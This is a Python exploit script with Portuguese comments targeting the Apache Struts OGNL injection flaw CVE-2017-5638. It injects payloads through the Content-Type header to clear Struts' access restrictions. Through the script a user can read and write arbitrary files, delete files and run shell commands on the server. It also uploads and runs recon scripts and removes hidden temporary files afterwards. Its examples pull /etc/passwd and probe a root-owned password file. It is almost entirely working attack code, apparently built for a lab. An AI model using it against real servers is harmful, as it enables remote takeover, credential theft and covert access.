#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pivot4.py -- canal OGNL (CVE-2017-5638), primitivas independentes.
  read  : Files.readAllBytes + Arrays.copyOfRange   -> 0 execve
  write : FileOutputStream / File.delete()          -> 0 execve
  exec  : ProcessBuilder                            -> 1 execve por comando

  python3 pivot4.py selftest
  python3 pivot4.py exec -- 'id; hostname'
  python3 pivot4.py run  --script etapa2_recon.sh
  python3 pivot4.py get  --remote /etc/passwd --local ./passwd.txt
  python3 pivot4.py put  --local x.sh --remote /tmp/x.sh
"""
import argparse
import base64
import binascii
import os
import re
import secrets
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit

BOUND = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
MBODY = (("--%s\r\n" % BOUND).encode()
         + b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
         + b"Content-Type: text/plain\r\n\r\nlab\r\n"
         + ("--%s--\r\n" % BOUND).encode())

BYPASS = ("(#_='multipart/form-data')"
          ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
          ".(#_memberAccess?(#_memberAccess=#dm):"
          "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
          ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
          ".(#ognlUtil.getExcludedPackageNames().clear())"
          ".(#ognlUtil.getExcludedClasses().clear())"
          ".(#context.setMemberAccess(#dm))))")

HP = "X-P"
CAP = 3400          # bytes crus por resposta (b64 ~4.5 KB, folga no header 8192)


def esc(s):
    return s.replace("\\", "\\\\").replace("'", "\\'")


def b64d(s):
    s = (s or "").strip().replace("-", "+").replace("_", "/")
    if not s:
        return b""
    return base64.b64decode(s + "=" * ((-len(s)) % 4))


def _hdr_const(v):
    return (".(#r=@org.apache.struts2.ServletActionContext@getResponse())"
            ".(#r.setHeader('" + HP + "','" + v + "'))")


def _hdr_e():
    return (".(#r=@org.apache.struts2.ServletActionContext@getResponse())"
            ".(#r.setHeader('" + HP + "',#e))")


# ------------------------------------------------------- payloads (OGNL) ----
def p_len(path):
    return ("%{" + BYPASS
            + ".(#e=@java.util.Base64@getEncoder().encodeToString("
              "(''+(new java.io.File('" + esc(path) + "')).length()).getBytes()))"
            + _hdr_e() + "}")


def p_slice(path, off, cap=CAP):
    return ("%{" + BYPASS
            + ".(#a=@java.nio.file.Files@readAllBytes("
              "new java.io.File('" + esc(path) + "').toPath()))"
            + ".(#s=@java.util.Arrays@copyOfRange(#a," + str(off) + ","
              "@java.lang.Math@min(#a.length," + str(off + cap) + ")))"
            + ".(#e=@java.util.Base64@getEncoder().encodeToString(#s))"
            + _hdr_e() + "}")


def p_write(path, b64, append):
    return ("%{" + BYPASS
            + ".(#b=@java.util.Base64@getDecoder().decode('" + b64 + "'))"
            + ".(#o=new java.io.FileOutputStream('" + esc(path) + "',"
            + ("true" if append else "false") + "))"
            + ".(#o.write(#b)).(#o.close())"
            + _hdr_const("MQ==") + "}")


def p_rm(path):
    return ("%{" + BYPASS
            + ".(#e=@java.util.Base64@getEncoder().encodeToString("
              "(''+(new java.io.File('" + esc(path) + "')).delete()).getBytes()))"
            + _hdr_e() + "}")


def p_exec(cmd, outfile):
    return ("%{" + BYPASS
            + ".(#pb=new java.lang.ProcessBuilder(new java.lang.String[]{"
              "'/bin/sh','-c','" + esc(cmd) + "'}))"
            + ".(#pb.redirectErrorStream(true))"
            + ".(#pb.redirectOutput(new java.io.File('" + esc(outfile) + "')))"
            + ".(#p=#pb.start()).(#p.waitFor())"
            + _hdr_const("MQ==") + "}")


# ---------------------------------------------------------------- transporte -
class T:
    def __init__(self, url, timeout=45.0):
        u = urlsplit(url if "://" in url else "http://" + url)
        self.host = u.hostname
        self.port = u.port or (443 if u.scheme == "https" else 8080)
        self.path = u.path or "/"
        self.tls = u.scheme == "https"
        self.timeout = timeout
        self.calls = 0
        self.baseline = 0

    def post(self, ctype):
        t0 = time.time()
        req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\nContent-Type: %s\r\n"
               "Content-Length: %d\r\nConnection: close\r\nAccept: */*\r\n"
               "User-Agent: s2045-lab/4\r\n\r\n"
               % (self.path, self.host, self.port, ctype, len(MBODY))
               ).encode("latin-1")
        s = socket.create_connection((self.host, self.port), self.timeout)
        buf, err = b"", None
        try:
            if self.tls:
                s = ssl._create_unverified_context().wrap_socket(
                    s, server_hostname=self.host)
            s.sendall(req + MBODY)
            s.settimeout(self.timeout)
            while True:
                try:
                    d = s.recv(65536)
                except (ConnectionResetError, ConnectionAbortedError):
                    err = "reset"
                    break
                except socket.timeout:
                    err = "timeout"
                    break
                except OSError as e:                              # noqa: BLE001
                    err = "oserror"
                    break
                if not d:
                    break
                buf += d
                if len(buf) > 262144:
                    break
        finally:
            try:
                s.close()
            except OSError:
                pass
        self.calls += 1
        i = buf.find(b"\r\n\r\n")
        head, body = (buf[:i], buf[i + 4:]) if i >= 0 else (buf, b"")
        lines = head.decode("latin-1", "replace").split("\r\n")
        h = {}
        for ln in lines[1:]:
            k, _, v = ln.partition(":")
            h[k.strip().lower()] = v.strip()
        return {"status": lines[0] if lines else "", "h": h, "body": body,
                "err": err, "dt": time.time() - t0}

    # -- primitiva unica: executa payload e devolve header decodificado ------
    def op(self, payload, label="op"):
        r = self.post(payload)
        v = r["h"].get(HP.lower())
        if v is None:
            raise RuntimeError("%s: sem header (%s, %dB%s)"
                               % (label, r["status"] or "-", len(r["body"]),
                                  "" if not r["err"] else ", " + r["err"]))
        try:
            return b64d(v)
        except (binascii.Error, ValueError) as e:
            raise RuntimeError("%s: b64 invalido (%s)" % (label, e))

    # -- I/O por OGNL puro ---------------------------------------------------
    def size(self, path):
        try:
            return int(self.op(p_len(path), "size").decode() or -1)
        except (ValueError, RuntimeError):
            return -1

    def read(self, path, local=None):
        n = self.size(path)
        data, off = b"", 0
        while True:
            chunk = self.op(p_slice(path, off), "read")
            if not chunk:
                break
            data += chunk
            off += CAP
            if (n >= 0 and len(data) >= n) or off > 64 * 1024 * 1024:
                break
        if local:
            open(local, "wb").write(data)
        return data

    def write(self, local, remote):
        blob = open(local, "rb").read()
        enc = base64.b64encode(blob).decode()
        self.op(p_write(remote, "", False), "trunc")
        for i in range(0, len(enc), 1000):
            self.op(p_write(remote, enc[i:i + 1000], True), "append")
        back = self.read(remote)
        if back != blob:
            raise RuntimeError("verificacao falhou: %d/%d bytes"
                               % (len(back), len(blob)))
        return len(blob)

    def rm(self, path):
        try:
            self.op(p_rm(path), "rm")
        except RuntimeError:
            pass

    # -- execucao ------------------------------------------------------------
    def exec(self, cmd):
        out = "/tmp/.p4.%s" % secrets.token_hex(4)
        self.op(p_exec(cmd, out), "exec")
        data = self.read(out)
        self.rm(out)
        return data

    def run_script(self, local, tmo=240):
        tag = secrets.token_hex(4)
        rsh = "/tmp/.p4s.%s.sh" % tag
        rout = "/tmp/.p4s.%s.out" % tag
        rrc = "/tmp/.p4s.%s.rc" % tag
        n = self.write(local, rsh)
        self.op(p_exec("timeout %d sh %s > %s 2>&1; echo RC=$?"
                       % (tmo, rsh, rout), rrc), "run")
        rcv = self.read(rrc).decode("utf-8", "replace")
        out = self.read(rout)
        for f in (rsh, rout, rrc):
            self.rm(f)
        m = re.findall(r"RC=(\d+)", rcv)
        return (m[-1] if m else "?"), out, n


# ------------------------------------------------------------------ selftest -
def selftest(t):
    b = t.post("multipart/form-data; boundary=%s" % BOUND)
    t.baseline = len(b["body"])
    print("baseline : %s | %d B" % (b["status"] or "-", t.baseline))
    checks = []

    def run(name, fn, show):
        try:
            r = fn()
            txt = show(r)
            print("%-12s OK   %s" % (name, txt))
            checks.append(True)
        except Exception as e:                                  # noqa: BLE001
            print("%-12s FAIL %s" % (name, e))
            checks.append(False)

    run("read", lambda: t.read("/etc/hostname"),
        lambda r: r.decode("utf-8", "replace").strip()[:60])
    run("size", lambda: t.size("/root/senhas_servidores.txt"),
        lambda r: "%d bytes" % r)
    run("exec", lambda: t.exec("id -un; hostname"),
        lambda r: r.decode("utf-8", "replace").replace("\n", " | ")[:70])
    run("write", lambda: (open("/tmp/.st", "w").write("SELFTEST\n"),
                          t.write("/tmp/.st", "/tmp/.st.remote"))[1],
        lambda r: "%d bytes (verificado por readback)" % r)
    run("rm", lambda: t.rm("/tmp/.st.remote"),
        lambda r: "removido")

    print("\n%d/%d primitivas OK" % (sum(checks), len(checks)))
    return 0 if all(checks) else 1


# ---------------------------------------------------------------------- main -
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://10.0.1.10:8080/")
    ap.add_argument("--path", default=None)
    ap.add_argument("--timeout", type=float, default=45.0)
    sub = ap.add_subparsers(dest="op", required=True)
    sub.add_parser("selftest")
    p = sub.add_parser("run")
    p.add_argument("--script", required=True)
    p.add_argument("--tmo", type=int, default=240)
    p = sub.add_parser("exec")
    p.add_argument("cmd")
    p = sub.add_parser("get")
    p.add_argument("--remote", required=True)
    p.add_argument("--local", default=None)
    p = sub.add_parser("put")
    p.add_argument("--local", required=True)
    p.add_argument("--remote", required=True)
    a = ap.parse_args()

    t = T(a.url, a.timeout)
    if a.path:
        t.path = a.path
    try:
        if a.op == "selftest":
            return selftest(t)
        if a.op == "exec":
            out = t.exec(a.cmd)
            sys.stdout.write(out.decode("utf-8", "replace"))
            if out and not out.endswith(b"\n"):
                sys.stdout.write("\n")
            return 0
        if a.op == "get":
            data = t.read(a.remote, a.local)
            print("[pivot] %s -> %s (%d B, %d requisicoes)"
                  % (a.remote, a.local or "-", len(data), t.calls))
            return 0
        if a.op == "put":
            print("[pivot] %d B -> %s (verificado)"
                  % (t.write(a.local, a.remote), a.remote))
            return 0
        if a.op == "run":
            if not os.path.exists(a.script):
                sys.exit("script nao encontrado: " + a.script)
            rc, out, n = t.run_script(a.script, a.tmo)
            print("[pivot] %s (%d B) | rc=%s | %d requisicoes"
                  % (os.path.basename(a.script), n, rc, t.calls))
            print("----- saida -----")
            sys.stdout.write(out.decode("utf-8", "replace").rstrip("\n") + "\n")
            print("-----------------")
            return 0 if rc == "0" else 1
    except RuntimeError as e:
        print("[pivot] ERRO: %s" % e)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
